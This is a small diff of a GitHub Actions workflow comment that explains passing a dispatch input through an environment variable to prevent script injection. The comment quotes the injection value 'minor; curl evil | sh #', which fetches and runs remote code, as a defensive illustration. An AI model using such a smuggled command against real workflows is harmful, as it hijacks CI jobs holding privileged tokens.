@@ -90,7 +90,7 @@ jobs:
           # which silently breaks brew-update.yml.
           GITHUB_TOKEN: ${{ steps.token.outputs.token }}
           # Pass the workflow_dispatch input through an env var, never inline
-          # ${{ … }} interpolation, so a dispatch value like
+          # GitHub-expression interpolation, so a dispatch value like
           # `minor; curl evil | sh #` can't break out of the `run:` shell and
           # execute arbitrary code in a job holding the App token + id-token:
           # write (GHA script-injection). ${VAR:+"$VAR"} preserves the
